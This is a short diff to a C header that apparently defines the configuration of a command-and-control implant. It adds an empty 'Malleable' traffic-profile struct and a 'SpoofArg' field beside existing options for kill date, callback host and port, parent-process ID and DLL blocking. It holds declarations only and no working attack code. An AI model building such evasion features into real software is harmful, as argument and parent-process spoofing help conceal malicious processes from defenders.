@@ -363,6 +363,10 @@ typedef struct {
     } KillDate;
 
     struct {
+        struct {
+            // PBYTE 
+        } Malleable;
+
         WCHAR** Host;
         ULONG*  Port;
         WCHAR** EndPoint;
@@ -452,6 +456,7 @@ namespace Root {
 
             struct {
                 ULONG  ParentID;
+                WCHAR* SpoofArg;
                 BOOL   BlockDlls;
                 WCHAR* CurrentDir;
                 BOOL   Pipe;
